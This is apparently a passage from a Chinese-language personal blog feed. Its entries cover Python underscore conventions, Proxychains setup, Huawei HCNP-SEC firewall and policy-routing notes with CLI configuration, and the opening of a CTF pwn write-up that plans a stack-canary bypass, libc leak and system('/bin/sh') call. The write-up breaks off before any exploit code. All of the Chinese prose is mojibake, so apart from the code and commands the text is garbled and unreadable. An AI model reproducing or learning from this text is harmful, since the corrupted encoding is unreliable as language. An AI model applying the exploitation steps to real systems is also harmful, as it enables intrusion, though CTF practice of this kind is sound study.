    <content type="html"><![CDATA[<p>åœ¨ç”¨pythoné‡å†™ç®—æ³•ï¼Œå­¦ä¹ å­¦ä¹ ç®—æ³•æ—¶ï¼Œä¸€æ—¶å¥½å¥‡ï¼ˆæ‰“åŸºç¡€ï¼‰æ¥å­¦ä¹ äº†pythonçš„ä¸‹åˆ’çº¿</p><ul><li><p>å•å‰å¯¼ä¸‹åˆ’çº¿ï¼š_var            å°å°è­¦ç¤ºï¼Œæç¤ºåªåœ¨å†…éƒ¨ä½¿ç”¨ï¼Œépublicå’Œprivateé‚£ç§</p></li><li><p>å•æœ«å°¾ä¸‹åˆ’çº¿ï¼švar_            è§£å†³å‘½åå†²çªçš„é—®é¢˜</p></li><li><p>åŒå‰å¯¼ä¸‹åˆ’çº¿ï¼š__var          é˜²æ­¢å˜é‡åœ¨å­ç±»ä¸­è¢«é‡å†™ï¼Œåªèƒ½åœ¨ç±»å†…è®¿é—®</p></li><li><p>å•ä¸‹åˆ’çº¿ï¼š_                        ä½¿ç”¨â€œ_â€æ¥è¡¨ç¤ºå®ƒåªæ˜¯ä¸€ä¸ªä¸´æ—¶å€¼</p></li><li><p>åŒå‰å¯¼å’Œæœ«å°¾ä¸‹åˆ’çº¿ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-emphasis">__var__</span><br></code></pre></td></tr></table></figure><p>è¿™ä¸ªæ„Ÿè§‰æœ‰ç‚¹å¥‡æ€ªï¼Œä¸€ä¸ªæ˜¯å¸¸è§çš„ç±»å†…initï¼Œå¦ä¸€ä¸ªåˆ™æ˜¯ä¸‹é¢è¿™ç§lençš„å†™æ³•</p><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Linkedlist</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span><br>        self.head = Node()<br>        self.length = <span class="hljs-number">0</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__len__</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">return</span> self.length<br></code></pre></td></tr></table></figure><p>å½“æˆ‘åœ¨mainé‡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    L = Linkedlist()<br>    L.append(<span class="hljs-number">3</span>)<br>    L.append(<span class="hljs-number">5</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;é“¾è¡¨é•¿åº¦&quot;</span>,<span class="hljs-built_in">len</span>(L))<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>è¿™æ ·ä¹Ÿå¯ä»¥è¾“å‡ºlenæ¥= =</p></li></ul><p>  å­¦ä¹ çš„ç½‘ç«™ï¼š</p><ul><li><a href="https://blog.csdn.net/tcx1992/article/details/80105645">https://blog.csdn.net/tcx1992/article/details/80105645</a></li><li><a href="https://blog.csdn.net/zhangvalue/article/details/93606688">https://blog.csdn.net/zhangvalue/article/details/93606688</a></li></ul><p>  æ„Ÿè§‰è·Ÿç€ä¸€æ­¥æ­¥æµ‹è¯•ä¸‹æ¥æ›´ä¼šç”¨ï¼Œä½†æƒ³å®Œå…¨çŸ¥é“æ€ä¹ˆæ¥çš„ä¼°è®¡å¾—å»ç¿»æ–‡æ¡£www</p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
      <category>å­¦ä¹ </category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Proxychains</title>
    <link href="/2020/01/13/Proxychains/"/>
    <url>/2020/01/13/Proxychains/</url>
    
    <content type="html"><![CDATA[<p>æŠ˜è…¾ä¸¤å°æ—¶ï¼Œä¸å¦‚é—®ä¸€ä¸‹äºº= =</p><p>Proxychains</p><p>å…ˆå®‰è£…</p><p>ç„¶åsudo vi /etc/proxychains.conf</p><p>socks5 win_ip 1080</p><p>win_ipä¸ºä½ çš„windowsä¸»æœºipï¼Œå¯åœ¨cmd ifconfigæŸ¥çœ‹</p><p>é£æœºè¦æ‰“å¼€å…è®¸å±€åŸŸç½‘è¿æ¥</p><img src="/2020/01/13/Proxychains/image-20200110135926592.png" class="" title="image-20200110135926592"><p>ç„¶åè¿è¡Œæµ‹è¯•</p><p>proxychains4 telnet <a href="http://www.google.com">www.google.com</a> 443</p><p>å¯ä»¥ä¹‹åå°±å¯ä»¥ç›´æ¥sudo proxychains4 apt-get updateäº†</p>]]></content>
    
    
    <categories>
      
      <category>Linuxä½¿ç”¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux é—®é¢˜è§£å†³</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HCNP-SEC-19.11.23</title>
    <link href="/2020/01/13/HCNP-SEC-19.11.23/"/>
    <url>/2020/01/13/HCNP-SEC-19.11.23/</url>
    
    <content type="html"><![CDATA[<img src="/2020/01/13/HCNP-SEC-19.11.23/648EB2E3-ECFB-4610-AC4F-C41A40C726F0.png" class="" title="648EB2E3-ECFB-4610-AC4F-C41A40C726F0"><blockquote><p>eSightç½‘ç®¡ å¯ç®¡å…¶ä»–å‚å•†è®¾å¤‡ï¼Œå‡ ä¹éƒ½å¯ä»¥</p><p>CISå¯ç”¨äºæŠµå¾¡APTæ”»å‡»ã€‚å®ƒä»æµ·é‡æ•°æ®ä¸­æå–å…³é”®ä¿¡æ¯ï¼Œæ™ºèƒ½å¯è§†åŒ–ï¼Œè¿˜åŸæ”»å‡»é“¾ï¼Œé˜²å¾¡æ”»å‡»</p><p>FireHunterè¿˜åŸæµé‡ï¼Œåœ¨è™šæ‹Ÿç¯å¢ƒå¯¹ç½‘ç»œä¸­ä¼ è¾“çš„æ–‡ä»¶è¿›è¡Œæ£€æµ‹</p><p>UMA å®¡è®¡ä¸Šç½‘è¡Œä¸º</p><p>NGFW USG9000 ç½‘ç»œè¿è¥å•†ï¼Œå¹¿ç”µï¼ˆè¶…å¤§å‹ç½‘ç»œï¼‰USG6000 ä¸­å¤§å‹ä¼ä¸š</p><p>ä¸šåŠ¡éšè¡Œ</p><p>S12700 æ•´ä¸ªç½‘ç»œæ ¸å¿ƒ S9k S7k</p><img src="/2020/01/13/HCNP-SEC-19.11.23/61051AC5-C8D2-47E8-9516-09E3979F7769.png" class="" title="61051AC5-C8D2-47E8-9516-09E3979F7769"></blockquote><h2 id="ç½‘ç»œå®‰å…¨è¿ç»´"><a href="#ç½‘ç»œå®‰å…¨è¿ç»´" class="headerlink" title="ç½‘ç»œå®‰å…¨è¿ç»´"></a>ç½‘ç»œå®‰å…¨è¿ç»´</h2><p>å®‰å…¨ç­–ç•¥ï¼šç®€å•ï¼Œç¨³å®šï¼Œå®‰å…¨</p><p>ç«¯å£è¦åŠ ç«¯å£æè¿°</p><p>è„šæœ¬é…ç½®</p><img src="/2020/01/13/HCNP-SEC-19.11.23/52CCD98F-87B0-4D17-9CD9-043B92E84B1E.png" class="" title="52CCD98F-87B0-4D17-9CD9-043B92E84B1E"><img src="/2020/01/13/HCNP-SEC-19.11.23/6D82AE28-99ED-4EE5-8BAF-F34E0639D652.png" class="" title="6D82AE28-99ED-4EE5-8BAF-F34E0639D652"><img src="/2020/01/13/HCNP-SEC-19.11.23/9C6D9139-095E-43E4-A914-232B379D1387.png" class="" title="9C6D9139-095E-43E4-A914-232B379D1387"><img src="/2020/01/13/HCNP-SEC-19.11.23/0C995BDD-0A38-483B-B32B-727CA8AAF2C4.png" class="" title="0C995BDD-0A38-483B-B32B-727CA8AAF2C4"><blockquote><p>ç›‘æ§ï¼ˆç±»ä¼¼åªè¯»ï¼‰</p></blockquote><img src="/2020/01/13/HCNP-SEC-19.11.23/4731E999-DBE2-4436-B428-3BC61E399D80.png" class="" title="4731E999-DBE2-4436-B428-3BC61E399D80"><img src="/2020/01/13/HCNP-SEC-19.11.23/B33BEC42-D775-4EDF-98B9-08454E630607.png" class="" title="B33BEC42-D775-4EDF-98B9-08454E630607"><img src="/2020/01/13/HCNP-SEC-19.11.23/3B696243-B418-4CCF-AE64-B94BC4556C4D.png" class="" title="3B696243-B418-4CCF-AE64-B94BC4556C4D"><img src="/2020/01/13/HCNP-SEC-19.11.23/3CAA5AFE-7E9C-48D1-BC36-7D357E6FCEF3.png" class="" title="3CAA5AFE-7E9C-48D1-BC36-7D357E6FCEF3"><img src="/2020/01/13/HCNP-SEC-19.11.23/7BC6559D-1E13-4026-AC0A-B341738B51A7.png" class="" title="7BC6559D-1E13-4026-AC0A-B341738B51A7"><img src="/2020/01/13/HCNP-SEC-19.11.23/C7585DFE-372F-4841-B579-E5ABF8B743C4.png" class="" title="C7585DFE-372F-4841-B579-E5ABF8B743C4"><img src="/2020/01/13/HCNP-SEC-19.11.23/A037C828-5CD5-4549-A6A4-E7E7CBE5A54C.png" class="" title="A037C828-5CD5-4549-A6A4-E7E7CBE5A54C"><img src="/2020/01/13/HCNP-SEC-19.11.23/62BE7CDD-3135-430E-987F-6EACF0D80B0A.png" class="" title="62BE7CDD-3135-430E-987F-6EACF0D80B0A"><img src="/2020/01/13/HCNP-SEC-19.11.23/FE1DD198-9061-4788-819D-4EB92584BB87.png" class="" title="FE1DD198-9061-4788-819D-4EB92584BB87"><img src="/2020/01/13/HCNP-SEC-19.11.23/9DCB02F8-A1E8-49FB-B30B-8D1D93C28D5E.png" class="" title="9DCB02F8-A1E8-49FB-B30B-8D1D93C28D5E"><img src="/2020/01/13/HCNP-SEC-19.11.23/C3771611-034E-4CE2-B951-D908189A4396.png" class="" title="C3771611-034E-4CE2-B951-D908189A4396"><img src="/2020/01/13/HCNP-SEC-19.11.23/C8E502F2-BA95-4D88-980E-B339A71104CC.png" class="" title="C8E502F2-BA95-4D88-980E-B339A71104CC"><p>QS ä¼˜å…ˆçº§ï¼Ÿä¼˜å…ˆä¿è¯ä¸šåŠ¡</p><p>FWä½œä¸ºå‡ºå£ä¸”æœ‰å¤šæ¡å‡ºå£é“¾è·¯ï¼Œä¸¤æ¡é“¾è·¯ä¸€æ¥ï¼Œæœ€èµ·ç ä¹Ÿè¦åšä¸€ä¸ªé“¾è·¯èšåˆï¼ˆEth-Trunckï¼‰</p><p>åœ¨enspä¸­ï¼Œfwè¿æ¥routerï¼Œåœ¨å®é™…ä¸­ä¸ä¼šå ç”¨GE0/0/0ï¼ˆè¿™æ˜¯ä¸ªç®¡ç†å£ï¼‰</p><h2 id="æ™ºèƒ½é€‰è·¯åº”ç”¨åœºæ™¯"><a href="#æ™ºèƒ½é€‰è·¯åº”ç”¨åœºæ™¯" class="headerlink" title="æ™ºèƒ½é€‰è·¯åº”ç”¨åœºæ™¯"></a>æ™ºèƒ½é€‰è·¯åº”ç”¨åœºæ™¯</h2><p>ç½‘ç»œå·®ï¼Œå¦‚ä½•ä¼˜åŒ–ï¼šå¢åŠ å¸¦å®½ï¼Œå¢åŠ IPï¼Œè°ƒæ•´ç‚¹ä½</p><img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130211703575.png" class="" title="image-20191130211703575"><ul><li>å…¨å±€é€‰è·¯ç­–ç•¥ï¼šåŠ¨æ€é€‰æ‹©å‡ºæ¥å£ï¼Œå……åˆ†åˆ©ç”¨èµ„æº</li><li>ç­–ç•¥è·¯ç”±ï¼šä¾æ®åˆ¶å®šçš„ç­–ç•¥è¿›è¡Œæ•°æ®è½¬å‘</li><li><strong>ISPè·¯ç”±</strong>ï¼šå¯ä»¥å®ç°æµé‡æŒ‰ç…§è¿è¥å•†è½¬å‘ï¼ŒæŒ‡å®šé€‰è·¯</li><li>å¥åº·æ£€æŸ¥ï¼Œæ„ŸçŸ¥æœåŠ¡å™¨æˆ–é“¾è·¯çŠ¶æ€å˜åŒ–ï¼Œä¿è¯æµé‡ä¼ è¾“</li></ul><blockquote><p>å›­åŒºç½‘çš„å››å¤§æ•æ·ç‰¹æ€§ï¼šæœ‰çº¿æ— çº¿æ·±åº¦èåˆï¼Œä¸šåŠ¡éšè¡Œï¼Œå®‰å…¨åé˜²ï¼ŒIPCAè´¨é‡æ„ŸçŸ¥ï¼ˆæå°‘ï¼‰</p></blockquote><img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130213239431.png" class="" title="image-20191130213239431"><blockquote><p>è·¯ç”±ç­–ç•¥å’Œç­–ç•¥è·¯ç”±çš„åŒºåˆ«ï¼Ÿï¼Ÿ</p></blockquote><h2 id="é€‰è·¯åŸç†"><a href="#é€‰è·¯åŸç†" class="headerlink" title="é€‰è·¯åŸç†"></a>é€‰è·¯åŸç†</h2><img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130213351116.png" class="" title="image-20191130213351116"><h3 id="è¿‡è½½ä¿æŠ¤ï¼šæœ‰é¢„å€¼"><a href="#è¿‡è½½ä¿æŠ¤ï¼šæœ‰é¢„å€¼" class="headerlink" title="è¿‡è½½ä¿æŠ¤ï¼šæœ‰é¢„å€¼"></a>è¿‡è½½ä¿æŠ¤ï¼šæœ‰é¢„å€¼</h3><ul><li>æ ¹æ®å¸¦å®½ï¼šé»˜è®¤çš„ã€‚<strong>åŸæµé‡ä»ä»è¯¥é“¾è·¯èµ°ï¼Œåç»­ä¸å†ã€‚å¹¶ä¸”å…¨éƒ¨è¿‡è½½ï¼Œåˆ™ç»§ç»­æ ¹æ®æ¯”ä¾‹åˆ†é…æµé‡</strong><img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130220056847.png" class="" title="image-20191130220056847"></li><li><img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130220558188.png" class="" title="image-20191130220558188"></li></ul><blockquote><p>å…¥æ–¹å‘ï¼Ÿå‡ºæ–¹å‘ï¼Ÿ</p></blockquote><ul><li>æ ¹æ®é“¾è·¯è´¨é‡ï¼š<strong>ä¿è¯è´¨é‡ï¼Œä¿è¯ä½“éªŒ</strong><img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130221210672.png" class="" title="image-20191130221210672"></li><li><img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130221323811.png" class="" title="image-20191130221323811"></li><li>æ ¹æ®é“¾è·¯æƒé‡ï¼šæ ¹æ®é¢„è®¾çš„æƒé‡</li><li>æ ¹æ®é“¾è·¯ä¼˜å…ˆçº§ï¼šé»˜è®¤ä¼˜å…ˆçº§é«˜çš„ï¼Œè¶…è¿‡è¿‡è½½é˜ˆå€¼æ—¶å¯ç”¨ä¼˜å…ˆçº§æ¬¡é«˜çš„é“¾è·¯ã€‚ï¼ˆå°‘ç”¨ï¼Œä¸å¯èƒ½é—²ç½®ï¼‰</li></ul><h3 id="è¿‡è½½ä¿æŠ¤çš„é—®é¢˜"><a href="#è¿‡è½½ä¿æŠ¤çš„é—®é¢˜" class="headerlink" title="è¿‡è½½ä¿æŠ¤çš„é—®é¢˜"></a>è¿‡è½½ä¿æŠ¤çš„é—®é¢˜</h3><img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130221945199.png" class="" title="image-20191130221945199"><p>ä¼šè¯ä¿æŒï¼š<img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130222127477.png" class="" title="image-20191130222127477"></p><p>æŸ¥çœ‹ä¼šè¯ä¿æŒè¡¨é¡¹ï¼ˆè¦æœ‰æµé‡ç»è¿‡æ‰èƒ½æŸ¥çœ‹åˆ°</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-attribute">display</span> session persistence <span class="hljs-selector-tag">table</span><br></code></pre></td></tr></table></figure><h2 id="ç­–ç•¥è·¯ç”±"><a href="#ç­–ç•¥è·¯ç”±" class="headerlink" title="ç­–ç•¥è·¯ç”±"></a>ç­–ç•¥è·¯ç”±</h2><p>ä¾æ®ç”¨æˆ·åˆ¶å®šçš„ç­–ç•¥è¿›è¡Œè½¬å‘</p><p>bypass ç›´é€šæ¨¡å¼ï¼ŒFWç›¸å½“äºé€æ˜</p><img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130222809732.png" class="" title="image-20191130222809732"><img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130222832266.png" class="" title="image-20191130222832266"><blockquote><p>å…ˆçœ‹ç­–ç•¥ï¼Œæ— ç­–ç•¥åˆ™æŒ‰è·¯ç”±è¡¨è½¬å‘</p></blockquote><h2 id="ISPé€‰è·¯"><a href="#ISPé€‰è·¯" class="headerlink" title="ISPé€‰è·¯"></a>ISPé€‰è·¯</h2><p>åœ¨FWè¿æ¥å¤šä¸ªISPç½‘ç»œæ—¶ï¼Œé€šè¿‡ISPé€‰è·¯å¯ä»¥ä½¿è®¿é—®ç‰¹å®šISPçš„æµé‡é€šè¿‡ç›¸åº”å‡ºæ¥å£è½¬å‘ï¼Œä¿è¯æœ€çŸ­è·¯å¾„ã€‚</p><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>å†™å…¥CSVæ–‡ä»¶ï¼ˆè¯¥æ–‡ä»¶æˆä¸ºISPåœ°å€æ–‡ä»¶ï¼‰ï¼Œç„¶åå¯¼å…¥FW</p><img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130223451969.png" class="" title="image-20191130223451969"><blockquote><p>å¯¼å…¥ISPåœ°å€æ–‡ä»¶ï¼šWebç•Œé¢æ“ä½œ ç½‘ç»œ &gt; è·¯ç”± &gt; æ™ºèƒ½é€‰è·¯ &gt; è¿è¥å•†åœ°å€åº“</p><p>åº”ç”¨ï¼š ç½‘ç»œ&gt; æ¥å£ &gt; ç¼–è¾‘</p></blockquote><h3 id="å¯é€‰ï¼šå¥åº·æ£€æŸ¥"><a href="#å¯é€‰ï¼šå¥åº·æ£€æŸ¥" class="headerlink" title="å¯é€‰ï¼šå¥åº·æ£€æŸ¥"></a>å¯é€‰ï¼šå¥åº·æ£€æŸ¥</h3><p>æ¢æµ‹åˆ°æ— æ³•è®¿é—®ï¼Œå¯¹åº”ISPè·¯ç”±ä¼šè¢«åˆ é™¤</p><img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130223853655.png" class="" title="image-20191130223853655"><h2 id="ç­–ç•¥è·¯ç”±åº”ç”¨"><a href="#ç­–ç•¥è·¯ç”±åº”ç”¨" class="headerlink" title="ç­–ç•¥è·¯ç”±åº”ç”¨"></a>ç­–ç•¥è·¯ç”±åº”ç”¨</h2><p>ä¿®æ”¹åç§°ï¼Œé…ç½®ç«¯å£æè¿°</p><img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130224518587.png" class="" title="image-20191130224518587"><img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130224603119.png" class="" title="image-20191130224603119"><img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130224624111.png" class="" title="image-20191130224624111"><h3 id="å‘½ä»¤è¡Œ"><a href="#å‘½ä»¤è¡Œ" class="headerlink" title="å‘½ä»¤è¡Œ"></a>å‘½ä»¤è¡Œ</h3><p>é…ç½®å®‰å…¨åŒºåŸŸ</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">interface</span> GE<span class="hljs-number">1</span>/<span class="hljs-number">0</span>/<span class="hljs-number">2</span><br><span class="hljs-attribute">ip</span> address <span class="hljs-number">10.10.1.1</span> <span class="hljs-number">24</span><br><span class="hljs-attribute">quit</span> <br><span class="hljs-attribute">interface</span> GE<span class="hljs-number">1</span>/<span class="hljs-number">0</span>/<span class="hljs-number">3</span><br><span class="hljs-attribute">ip</span> address <span class="hljs-number">10.1.1.1</span> <span class="hljs-number">24</span><br><span class="hljs-attribute">in</span> GE<span class="hljs-number">1</span>/<span class="hljs-number">0</span>/<span class="hljs-number">4</span><br><span class="hljs-attribute">ip</span> add <span class="hljs-number">10.20.1.1</span> <span class="hljs-number">24</span><br><span class="hljs-attribute">firewall</span> zone trust<br><span class="hljs-attribute">set</span> priority <span class="hljs-number">85</span><br><span class="hljs-attribute">add</span> interface GE<span class="hljs-number">1</span>/<span class="hljs-number">0</span>/<span class="hljs-number">3</span><br><span class="hljs-attribute">quit</span><br><span class="hljs-attribute">firewall</span> zone untrust<br><span class="hljs-attribute">set</span> priority <span class="hljs-number">5</span><br><span class="hljs-attribute">add</span> interface GE<span class="hljs-number">1</span>/<span class="hljs-number">0</span>/<span class="hljs-number">2</span><br><span class="hljs-attribute">add</span> interface GE<span class="hljs-number">1</span>/<span class="hljs-number">0</span>/<span class="hljs-number">4</span><br><br></code></pre></td></tr></table></figure><p>é…ç½®å®‰å…¨ç­–ç•¥</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">security</span>-<span class="hljs-keyword">policy</span><br><span class="hljs-keyword">rule</span> <span class="hljs-type">name</span> policy_sec_sec_trust_untrust<br>source-<span class="hljs-type">zone</span> trust<br>destination-<span class="hljs-type">zone</span> untrust<br>action permit<br>source-address <span class="hljs-number">10.1</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span> <span class="hljs-number">24</span> <br></code></pre></td></tr></table></figure><p>ä¸€å®šè¦å†™actionï¼Œä¸ç„¶é»˜è®¤ä¸å…è®¸é€šè¿‡</p><p>é…ç½®IP-Link</p><p>ç›®æ ‡ip é€šè¿‡ xx ç«¯å£ </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ip</span>-link check enable<br><span class="hljs-attribute">ip</span>-link name pbr_<span class="hljs-number">1</span><br><span class="hljs-attribute">destination</span> <span class="hljs-number">10.10.1.2</span> interface GE <span class="hljs-number">1</span>/<span class="hljs-number">0</span>/<span class="hljs-number">2</span><br><span class="hljs-attribute">quit</span><br><span class="hljs-attribute">ip</span>-link name pbr_<span class="hljs-number">2</span><br><span class="hljs-attribute">destination</span> <span class="hljs-number">10.20.1.2</span> interface GE <span class="hljs-number">1</span>/<span class="hljs-number">0</span>/<span class="hljs-number">4</span><br><br></code></pre></td></tr></table></figure><img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130225841573.png" class="" title="image-20191130225841573"><h2 id="æ•…éšœæ’æŸ¥"><a href="#æ•…éšœæ’æŸ¥" class="headerlink" title="æ•…éšœæ’æŸ¥"></a>æ•…éšœæ’æŸ¥</h2><img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130225907120.png" class="" title="image-20191130225907120"><p>ä¸»è¦é—®é¢˜å¤šä¸º<strong>åŸŸé—´æµé‡æ˜¯å¦æ”¾è¡Œ</strong></p><h2 id="å®éªŒ"><a href="#å®éªŒ" class="headerlink" title="å®éªŒ"></a>å®éªŒ</h2><img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130230708184.png" class="" title="image-20191130230708184"><p>å®éªŒè„šæœ¬</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">R1</span>:<br><span class="hljs-attribute">sys</span><br><span class="hljs-attribute">sysname</span> r<span class="hljs-number">1</span><br><span class="hljs-attribute">int</span> e<span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-attribute">ip</span> add <span class="hljs-number">10.1.1.2</span> <span class="hljs-number">24</span><br><span class="hljs-attribute">des</span> to-pc<span class="hljs-number">1</span>-e<span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">1</span><br><span class="hljs-attribute">q</span><br><span class="hljs-attribute">int</span> g<span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-attribute">ip</span> add <span class="hljs-number">10.10.1.1</span> <span class="hljs-number">24</span><br><span class="hljs-attribute">des</span> to-fw-g<span class="hljs-number">1</span>/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-attribute">q</span><br><span class="hljs-attribute">int</span> e<span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">1</span><br><span class="hljs-attribute">des</span> to-pc<span class="hljs-number">2</span>-e<span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">1</span><br><span class="hljs-attribute">ip</span> add <span class="hljs-number">10.1.2.2</span> <span class="hljs-number">24</span><br><br></code></pre></td></tr></table></figure><blockquote><p>Dis cu | in ip-link</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>ç½‘ç»œä¸“ä¸šçŸ¥è¯†</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>GXY_CTF_my_cannary-ä»é›¶è®°å½•å¦‚ä½•è°ƒè¯•å‡ºæ¥</title>
    <link href="/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/"/>
    <url>/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/</url>
    
    <content type="html"><![CDATA[<p>æŸ¥çœ‹main</p><img src="/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223003852267.png" class="" title="image-20191223003852267"><p>è¿›å…¥test()</p><img src="/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223003835308.png" class="" title="image-20191223003835308"><p>çœ‹è§äº†readï¼Œç­‰ç­‰å…ˆ</p><img src="/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223005942680.png" class="" title="image-20191223005942680"><p>judgeæ— æ³•åç¼–è¯‘ï¼ŒæŸ¥çœ‹æ±‡ç¼–</p><img src="/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223005319299.png" class="" title="image-20191223005319299"><p>çœ‹è§äº†xor rdx,[rbp-8]ï¼Œä»¥åŠä¸Šå›¾çš„mov rdx, [rdx] ä¹Ÿå°±æ˜¯å…ˆè®²rdxæŒ‡é’ˆé‡Œçš„æ•°å€¼æ”¾åœ¨rdxé‡Œï¼Œå†å°†rdxå’Œrbp-8çš„é‚£ä¸ªè¿›è¡Œå¼‚æˆ–ï¼Œä¸€è‡´åˆ™æ ¡éªŒæˆåŠŸ</p><p>ç‚¹å¼€readçš„buf</p><img src="/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223005537590.png" class="" title="image-20191223005537590"><p>bufåªæœ‰30å­—èŠ‚</p><p>å†çœ‹çœ‹strings</p><img src="/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223011138209.png" class="" title="image-20191223011138209"><p>æ²¡æœ‰/bin/sh</p><p>æ‰€ä»¥æˆ‘ä»¬å¾—å…ˆç»•è¿‡æ ˆæ ¡éªŒï¼Œå†leak libcåœ°å€ï¼Œç„¶åå†system /bin/sh</p><p>é‚å†™poc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 